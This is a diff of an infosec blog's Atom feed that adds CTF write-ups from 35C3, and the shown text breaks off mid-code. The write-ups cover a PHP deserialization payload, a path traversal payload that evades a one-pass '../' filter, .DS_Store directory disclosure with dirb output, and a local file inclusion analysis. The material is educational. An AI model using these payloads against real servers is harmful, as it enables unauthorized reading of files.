@@ -1,4 +1,585 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-12-27T12:20:51+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">BoiteAKlou’s Infosec Blog</title><subtitle>Computer security oriented blog held by a french student in IT and Networks. This blog aims at teaching the fundamentals of Cyber Security to beginners through CTF write-ups and didactic articles.</subtitle><author><name>BoiteAKlou</name></author><entry><title type="html">Upgrading to a fully interactive reverse shell</title><link href="http://localhost:4000/Fully-interactive-reverse-shell.html" rel="alternate" type="text/html" title="Upgrading to a fully interactive reverse shell" /><published>2018-12-27T10:00:00+01:00</published><updated>2018-12-27T10:00:00+01:00</updated><id>http://localhost:4000/Fully-interactive-reverse-shell</id><content type="html" xml:base="http://localhost:4000/Fully-interactive-reverse-shell.html">&lt;p&gt;Let’s say you’re in the middle of a hacking challenge or pentesting assessment and you finally manage to get a &lt;strong&gt;reverse shell&lt;/strong&gt; on your target. This short article will explain you how to obtain &lt;span style=&quot;color:Green&quot;&gt;a fully interactive version of your reverse shell&lt;/span&gt;, that will allow commands like &lt;code class=&quot;highlighter-rouge&quot;&gt;su&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;vi&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;nano&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt;, etc… but also &lt;strong&gt;CTRL+C&lt;/strong&gt; and &lt;strong&gt;tab completion&lt;/strong&gt;.
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-12-31T17:30:25+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">BoiteAKlou’s Infosec Blog</title><subtitle>Computer security oriented blog held by a french student in IT and Networks. This blog aims at teaching the fundamentals of Cyber Security to beginners through CTF write-ups and didactic articles.</subtitle><author><name>BoiteAKlou</name></author><entry><title type="html">35C3 CTF Writeups</title><link href="http://localhost:4000/35C3-CTF-Writeups.html" rel="alternate" type="text/html" title="35C3 CTF Writeups" /><published>2018-12-31T17:00:00+01:00</published><updated>2018-12-31T17:00:00+01:00</updated><id>http://localhost:4000/35C3-CTF-Writeups</id><content type="html" xml:base="http://localhost:4000/35C3-CTF-Writeups.html">&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-12-30/ccc-logo.gif&quot; alt=&quot;CCL logo&quot; title=&quot;CCL logo&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This weekend was held the &lt;strong&gt;35th Chaos Communication Congress (35C3)&lt;/strong&gt; as long as its excellent CTF. Hopefully, a Junior CTF was also proposed, which was way more accessible than the main CTF (at least for me :wink:). In this post, you’ll find &lt;span style=&quot;color:green;&quot;&gt;concise writeups&lt;/span&gt; of most of the challenges my team and I solved from both CTFs. &lt;br /&gt;
+ &lt;!--excerpt--&gt;&lt;/p&gt;
+
+&lt;h2 class=&quot;no_toc&quot; id=&quot;table-of-contents&quot;&gt;Table of Contents&lt;/h2&gt;
+
+&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#main-ctf-web---php&quot; id=&quot;markdown-toc-main-ctf-web---php&quot;&gt;[Main CTF] Web - php&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#solution&quot; id=&quot;markdown-toc-solution&quot;&gt;Solution&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#junior-ctf-web---flags&quot; id=&quot;markdown-toc-junior-ctf-web---flags&quot;&gt;[Junior CTF] Web - flags&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#solution-1&quot; id=&quot;markdown-toc-solution-1&quot;&gt;Solution&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#junior-ctf-web---logged-in&quot; id=&quot;markdown-toc-junior-ctf-web---logged-in&quot;&gt;[Junior CTF] Web - logged in&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#solution-2&quot; id=&quot;markdown-toc-solution-2&quot;&gt;Solution&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#junior-ctf-web---mcdonald&quot; id=&quot;markdown-toc-junior-ctf-web---mcdonald&quot;&gt;[Junior CTF] Web - McDonald&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#solution-3&quot; id=&quot;markdown-toc-solution-3&quot;&gt;Solution&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#junior-ctf-web---notee-accessible&quot; id=&quot;markdown-toc-junior-ctf-web---notee-accessible&quot;&gt;[Junior CTF] Web - Note(e) accessible&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#solution-4&quot; id=&quot;markdown-toc-solution-4&quot;&gt;Solution&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#junior-ctf-pwn---1996&quot; id=&quot;markdown-toc-junior-ctf-pwn---1996&quot;&gt;[Junior CTF] Pwn - 1996&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#solution-5&quot; id=&quot;markdown-toc-solution-5&quot;&gt;Solution&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#junior-ctf-pwn---poet&quot; id=&quot;markdown-toc-junior-ctf-pwn---poet&quot;&gt;[Junior CTF] Pwn - poet&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#solution-6&quot; id=&quot;markdown-toc-solution-6&quot;&gt;Solution&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#junior-ctf-forensic---rare_mount&quot; id=&quot;markdown-toc-junior-ctf-forensic---rare_mount&quot;&gt;[Junior CTF] Forensic - rare_mount&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#junior-ctf-forensic---epic_mount&quot; id=&quot;markdown-toc-junior-ctf-forensic---epic_mount&quot;&gt;[Junior CTF] Forensic - epic_mount&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#junior-ctf-forensic---legendary_mount&quot; id=&quot;markdown-toc-junior-ctf-forensic---legendary_mount&quot;&gt;[Junior CTF] Forensic - legendary_mount&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;main-ctf-web---php&quot;&gt;[Main CTF] Web - php&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;PHP’s unserialization mechanism can be exceptional. Guest challenge by jvoisin.&lt;/p&gt;
+
+  &lt;p&gt;Files at https://35c3ctf.ccc.ac/uploads/php-ff2d1f97076ff25c5d0858616c26fac7.tar. Challenge running at: nc 35.242.207.13 1&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;We were given the following PHP script:&lt;/p&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;trim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;fgets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;STDIN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;$flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file_get_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/flag'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;B&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__destruct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;unserialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Well that was unexpected…'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Here is what we can observe:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;The user input isn’t sanitized before being unserialized.&lt;/li&gt;
+  &lt;li&gt;Instantiating an object of type “B” would echo the flag.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3 id=&quot;solution&quot;&gt;Solution&lt;/h3&gt;
+
+&lt;p&gt;The following serialized payload will create a B object when getting unserialized: &lt;code class=&quot;highlighter-rouge&quot;&gt;O:1:&quot;B&quot;:1:{s:4:&quot;flag&quot;}&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;We can translate this payload into: “An &lt;strong&gt;O&lt;/strong&gt;bject whose name is &lt;strong&gt;1&lt;/strong&gt; char long, which has a &lt;strong&gt;s&lt;/strong&gt;tring whose name is &lt;strong&gt;flag&lt;/strong&gt; of size &lt;strong&gt;4&lt;/strong&gt;”.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-12-30/php-flag.png&quot; alt=&quot;php flag&quot; title=&quot;php flag&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;junior-ctf-web---flags&quot;&gt;[Junior CTF] Web - flags&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Fun with flags: http://35.207.132.47:84&lt;/p&gt;
+
+  &lt;p&gt;Flag is at /flag&lt;/p&gt;
+
+  &lt;p&gt;Difficulty estimate: Easy&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Here is a screen capture of the website’s frontpage:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-12-30/flags-site.png&quot; alt=&quot;Flags frontpage&quot; title=&quot;Flags frontpage&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Observations:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;$lang parameter is defined by HTTP_ACCEPT_LANGUAGE header.&lt;/li&gt;
+  &lt;li&gt;str_replace removes “../” but is only called once.&lt;/li&gt;
+  &lt;li&gt;The output of file_get_contents is base64-encoded inside the image.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3 id=&quot;solution-1&quot;&gt;Solution&lt;/h3&gt;
+
+&lt;p&gt;str_replace will remove “../” from the user-controlled header, but what about this string “…/./”?&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;php&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;php&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str_replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'../'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'..././'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;../&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Based on this, we can forge the following payload: &lt;code class=&quot;highlighter-rouge&quot;&gt;..././..././..././..././..././..././..././..././flag&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;php&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str_replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'../'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'..././..././..././..././..././..././..././..././flag'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;../../../../../../../../&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;flag&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then put it in place of the HTTP_ACCEPT_LANGUAGE header with Burpsuite and we have the following result:&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/code&amp;gt;&amp;lt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;data:image/jpeg;base64,MzVjM190aGlzX2ZsYWdfaXNfdGhlX2JlNXRfZmw0Zwo=&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;MzVjM190aGlzX2ZsYWdfaXNfdGhlX2JlNXRfZmw0Zwo=&quot;&lt;/span&gt; | base64 &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;
+35c3_this_flag_is_the_be5t_fl4g
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;junior-ctf-web---logged-in&quot;&gt;[Junior CTF] Web - logged in&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Phew, we totally did not set up our mail server yet. This is bad news since nobody can get into their accounts at the moment… It’ll be in our next sprint. Until then, since you cannot login: enjoy our totally finished software without account.&lt;/p&gt;
+
+  &lt;p&gt;http://35.207.132.47/&lt;/p&gt;
+
+  &lt;p&gt;Difficulty Estimate: Easy&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;We are facing a very basic website with a login functionnality asking for a username and sending a verification code. If we submit the right verification code, we get logged in. Pretty simple, right?&lt;/p&gt;
+
+&lt;h3 id=&quot;solution-2&quot;&gt;Solution&lt;/h3&gt;
+
+&lt;p&gt;Actually, the mail sending functionnality is not implemented yet and &lt;strong&gt;the verification code is retrieved by our client with a simple API call&lt;/strong&gt;, as shown in the following screen capture:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-12-30/loggedin-code.png&quot; alt=&quot;Loggedin code&quot; title=&quot;Loggedin code&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We can now submit the verification code to the appropriated field:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-12-30/loggedin-ask.png&quot; alt=&quot;Loggedin ask&quot; title=&quot;Loggedin ask&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And we can read the flag inside the cookies section:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-12-30/loggedin-flag.png&quot; alt=&quot;Loggedin flag&quot; title=&quot;Loggedin flag&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;junior-ctf-web---mcdonald&quot;&gt;[Junior CTF] Web - McDonald&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Our web admin name’s “Mc Donald” and he likes apples and always forgets to throw away his apple cores..&lt;/p&gt;
+
+  &lt;p&gt;http://35.207.132.47:85&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;This webpage was empty at first but the &lt;strong&gt;robots.txt&lt;/strong&gt; file shows us the following path: &lt;code class=&quot;highlighter-rouge&quot;&gt;/backup/.DS_Store&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;.DS_Store is a macOS only file which stores attributes of its containing folder. The idea, here, is to retrieve the location of the flag with the help of .DS_Store files. Problem is that the creator of this challenge was pretty naughty and created loads of subdirectories named “a”, “b” or “c”…&lt;/p&gt;
+
+&lt;h3 id=&quot;solution-3&quot;&gt;Solution&lt;/h3&gt;
+
+&lt;p&gt;Thanks to &lt;a href=&quot;https://digi.ninja/projects/fdb.php&quot;&gt;File Disclosure Browser&lt;/a&gt;, we could parse the .DS_Store file and extract information about the name of other files in the current folder.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaclou@Kalinka:~/CTF/2018/35C3-Junior/Web/McDonald&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;fdb/fdb.pl &lt;span class=&quot;nt&quot;&gt;--type&lt;/span&gt; ds &lt;span class=&quot;nt&quot;&gt;--filename&lt;/span&gt; ./DS_Store &lt;span class=&quot;nt&quot;&gt;--base_url&lt;/span&gt; http://35.207.91.38/backup
+/.DS_Store                                                                                                                              
+URL: http://35.207.91.38/backup/.DS_Store/a
+URL: http://35.207.91.38/backup/.DS_Store/a    
+URL: http://35.207.91.38/backup/.DS_Store/a
+URL: http://35.207.91.38/backup/.DS_Store/a   
+URL: http://35.207.91.38/backup/.DS_Store/b
+URL: http://35.207.91.38/backup/.DS_Store/b   
+URL: http://35.207.91.38/backup/.DS_Store/b
+URL: http://35.207.91.38/backup/.DS_Store/b
+URL: http://35.207.91.38/backup/.DS_Store/b
+URL: http://35.207.91.38/backup/.DS_Store/b
+URL: http://35.207.91.38/backup/.DS_Store/b
+URL: http://35.207.91.38/backup/.DS_Store/b
+URL: http://35.207.91.38/backup/.DS_Store/c                               
+URL: http://35.207.91.38/backup/.DS_Store/c
+URL: http://35.207.91.38/backup/.DS_Store/c
+URL: http://35.207.91.38/backup/.DS_Store/c
+URL: http://35.207.91.38/backup/.DS_Store/c
+URL: http://35.207.91.38/backup/.DS_Store/c
+URL: http://35.207.91.38/backup/.DS_Store/c
+URL: http://35.207.91.38/backup/.DS_Store/c
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;To make the browsing of all the subdirectories faster, I created a small wordlist containing the strings &lt;strong&gt;“a”&lt;/strong&gt;, &lt;strong&gt;“b”&lt;/strong&gt;, &lt;strong&gt;“c”&lt;/strong&gt; and &lt;strong&gt;“.DS_Store”&lt;/strong&gt; and fed it to &lt;code class=&quot;highlighter-rouge&quot;&gt;dirb&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;out.dirb | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;200
++ http://35.207.91.38/backup/.DS_Store &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:10244&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ http://35.207.91.38/backup/b/.DS_Store &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:6148&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ http://35.207.91.38/backup/c/.DS_Store &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:8196&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ http://35.207.91.38/backup/b/a/.DS_Store &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:8196&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ http://35.207.91.38/backup/b/b/.DS_Store &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:6148&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ http://35.207.91.38/backup/c/b/.DS_Store &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:12292&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ http://35.207.91.38/backup/c/c/.DS_Store &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:8196&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ http://35.207.91.38/backup/b/a/b/.DS_Store &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:6148&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ http://35.207.91.38/backup/b/a/c/.DS_Store &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:6148&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ http://35.207.91.38/backup/b/b/c/.DS_Store &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:6148&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Manually exploring each &lt;strong&gt;.DS_Store&lt;/strong&gt; file revealed the presence of &lt;strong&gt;flag.txt&lt;/strong&gt; under &lt;strong&gt;http://35.207.91.38/backup/b/a/c/flag.txt&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;35c3_Appl3s_H1dden_F1l3s&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;junior-ctf-web---notee-accessible&quot;&gt;[Junior CTF] Web - Note(e) accessible&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;We love notes. They make our lifes more structured and easier to manage! In 2018 everything has to be digital, and that’s why we built our very own note-taking system using micro services: Not(e) accessible! For security reasons, we generate a random note ID and password for each note.&lt;/p&gt;
+
+  &lt;p&gt;Recently, we received a report through our responsible disclosure program which claimed that our access control is bypassable…&lt;/p&gt;
+
+  &lt;p&gt;http://35.207.132.47:90&lt;/p&gt;
+
+  &lt;p&gt;Difficulty estimate: Easy-Medium&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;This website allows us to create a note and to consult it with an URL of this form: &lt;code class=&quot;highlighter-rouge&quot;&gt;http://35.207.120.163/view.php?id=6578216296439429496&amp;amp;pw=47bce5c74f589f4867dbd57e9ca9f808&lt;/code&gt; .&lt;/p&gt;
+
+&lt;p&gt;The source of this challenge is available under &lt;strong&gt;/src.tgz&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;Observations:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;The &lt;strong&gt;pw&lt;/strong&gt; parameter is the md5 hash of the note’s content.&lt;/li&gt;
+  &lt;li&gt;In the code, we see that the &lt;strong&gt;id is a random Integer&lt;/strong&gt;.&lt;/li&gt;
+  &lt;li&gt;The code of &lt;strong&gt;view.php&lt;/strong&gt; suggests a LFI vulnerability:
+    &lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+ &lt;span class=&quot;k&quot;&gt;require_once&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;config.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+ &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'id'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'pw'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+     &lt;span class=&quot;nv&quot;&gt;$id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'id'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+     &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;file_exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;./pws/&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;.pw&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
